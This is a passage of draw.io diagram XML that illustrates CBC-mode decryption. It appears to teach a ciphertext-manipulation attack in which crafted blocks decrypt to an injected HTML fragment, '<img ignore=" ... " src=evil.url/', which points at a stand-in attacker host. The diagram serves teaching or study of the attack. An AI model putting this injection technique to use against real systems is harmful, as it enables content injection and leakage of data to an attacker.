          <mxGeometry relative="1" as="geometry">
            <mxPoint x="250" y="169" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-42" value="" style="shape=orEllipse;perimeter=ellipsePerimeter;whiteSpace=wrap;html=1;backgroundOutline=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="240" y="130" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-43" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="UAS3PS1nQuCCnKRaGPEl-1" source="UAS3PS1nQuCCnKRaGPEl-2" target="UAS3PS1nQuCCnKRaGPEl-42">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="80" y="140" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-44" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="UAS3PS1nQuCCnKRaGPEl-1" source="UAS3PS1nQuCCnKRaGPEl-45" target="UAS3PS1nQuCCnKRaGPEl-37">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-45" value="" style="shape=orEllipse;perimeter=ellipsePerimeter;whiteSpace=wrap;html=1;backgroundOutline=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="410" y="130" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-46" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="UAS3PS1nQuCCnKRaGPEl-1" source="UAS3PS1nQuCCnKRaGPEl-11" target="UAS3PS1nQuCCnKRaGPEl-45">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="250" y="70" />
              <mxPoint x="340" y="70" />
              <mxPoint x="340" y="140" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-47" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="UAS3PS1nQuCCnKRaGPEl-1" source="UAS3PS1nQuCCnKRaGPEl-48" target="UAS3PS1nQuCCnKRaGPEl-42">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-48" value="decryption" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="215" y="90" width="70" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-49" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="UAS3PS1nQuCCnKRaGPEl-1" source="UAS3PS1nQuCCnKRaGPEl-11" target="UAS3PS1nQuCCnKRaGPEl-48">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-50" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="UAS3PS1nQuCCnKRaGPEl-1" source="UAS3PS1nQuCCnKRaGPEl-51" target="UAS3PS1nQuCCnKRaGPEl-45">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-51" value="decryption" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="385" y="90" width="70" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-52" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="UAS3PS1nQuCCnKRaGPEl-1" source="UAS3PS1nQuCCnKRaGPEl-20" target="UAS3PS1nQuCCnKRaGPEl-51">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-53" value="g0" style="text;html=1;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="220" y="200" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-54" value="garbage" style="text;html=1;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="390" y="200" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-55" value="&lt;div style=&quot;&quot;&gt;&lt;pre style=&quot;&quot;&gt;&lt;font face=&quot;Courier New&quot; style=&quot;font-size: 16px;&quot;&gt; &amp;lt;img ignore= &quot; &lt;/font&gt;&lt;/pre&gt;&lt;/div&gt;" style="rounded=0;whiteSpace=wrap;html=1;fillColor=#fff2cc;strokeColor=#d6b656;align=left;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="170" y="169" width="160" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-56" value="" style="group;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" connectable="0" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="510" y="30" width="160" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-57" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-56">
          <mxGeometry width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-58" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-56">
          <mxGeometry x="20" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-59" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-56">
          <mxGeometry x="40" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-60" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-56">
          <mxGeometry x="60" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-61" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-56">
          <mxGeometry x="80" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-62" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-56">
          <mxGeometry x="100" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-63" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-56">
          <mxGeometry x="120" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-64" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-56">
          <mxGeometry x="140" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-65" value="c0" style="text;html=1;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="550" width="80" height="30" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-66" value="" style="shape=orEllipse;perimeter=ellipsePerimeter;whiteSpace=wrap;html=1;backgroundOutline=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="580" y="130" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-67" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="UAS3PS1nQuCCnKRaGPEl-1" source="UAS3PS1nQuCCnKRaGPEl-68" target="UAS3PS1nQuCCnKRaGPEl-66">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-68" value="decryption" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="555" y="90" width="70" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-69" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="UAS3PS1nQuCCnKRaGPEl-1" source="UAS3PS1nQuCCnKRaGPEl-56" target="UAS3PS1nQuCCnKRaGPEl-68">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-70" value="g1" style="text;html=1;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="560" y="200" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-71" value="&lt;div style=&quot;&quot;&gt;&lt;pre style=&quot;&quot;&gt;&lt;div style=&quot;&quot;&gt;&lt;pre style=&quot;&quot;&gt;&lt;font face=&quot;Courier New&quot; style=&quot;font-size: 16px;&quot;&gt; &quot; src=evil.url/&lt;/font&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/div&gt;" style="rounded=0;whiteSpace=wrap;html=1;fillColor=#fff2cc;strokeColor=#d6b656;align=left;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="510" y="169" width="160" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-72" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="UAS3PS1nQuCCnKRaGPEl-1" source="UAS3PS1nQuCCnKRaGPEl-66" target="UAS3PS1nQuCCnKRaGPEl-71">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="590" y="169" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-73" value="" style="group;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" connectable="0" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="680" y="30" width="160" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-74" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-73">
          <mxGeometry width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-75" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-73">
          <mxGeometry x="20" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-76" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-73">
          <mxGeometry x="40" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-77" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-73">
          <mxGeometry x="60" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-78" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-73">
          <mxGeometry x="80" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-79" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-73">
          <mxGeometry x="100" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-80" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-73">
          <mxGeometry x="120" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-81" value="" style="rounded=0;whiteSpace=wrap;html=1;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-73">
          <mxGeometry x="140" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-82" value="c1" style="text;html=1;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="730" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-83" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="UAS3PS1nQuCCnKRaGPEl-1" source="UAS3PS1nQuCCnKRaGPEl-84">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="760" y="169" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-84" value="" style="shape=orEllipse;perimeter=ellipsePerimeter;whiteSpace=wrap;html=1;backgroundOutline=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="750" y="130" width="20" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-85" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="UAS3PS1nQuCCnKRaGPEl-1" source="UAS3PS1nQuCCnKRaGPEl-86" target="UAS3PS1nQuCCnKRaGPEl-84">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-86" value="decryption" style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="725" y="90" width="70" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-87" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="UAS3PS1nQuCCnKRaGPEl-1" source="UAS3PS1nQuCCnKRaGPEl-73" target="UAS3PS1nQuCCnKRaGPEl-86">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-88" value="p1" style="text;html=1;strokeColor=none;fillColor=none;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="730" y="200" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-89" value="&lt;div style=&quot;&quot;&gt;&lt;pre style=&quot;&quot;&gt;&lt;font style=&quot;font-size: 16px;&quot; face=&quot;Courier New&quot;&gt;:Se@ld-i5-great&lt;/font&gt;&lt;/pre&gt;&lt;/div&gt;" style="rounded=0;whiteSpace=wrap;html=1;align=left;fillColor=#f8cecc;strokeColor=#b85450;" vertex="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry x="680" y="170" width="160" height="20" as="geometry" />
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-90" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="420" y="70" />
              <mxPoint x="510" y="70" />
              <mxPoint x="510" y="140" />
            </Array>
            <mxPoint x="420" y="50" as="sourcePoint" />
            <mxPoint x="580" y="140" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="UAS3PS1nQuCCnKRaGPEl-91" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="UAS3PS1nQuCCnKRaGPEl-1">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="590" y="70" />
              <mxPoint x="680" y="70" />
              <mxPoint x="680" y="140" />
            </Array>
            <mxPoint x="590" y="50" as="sourcePoint" />
            <mxPoint x="750" y="140" as="targetPoint" />
          </mxGeometry>
        </mxCell>
      </root>
    </mxGraphModel>
  </diagram>
</mxfile>
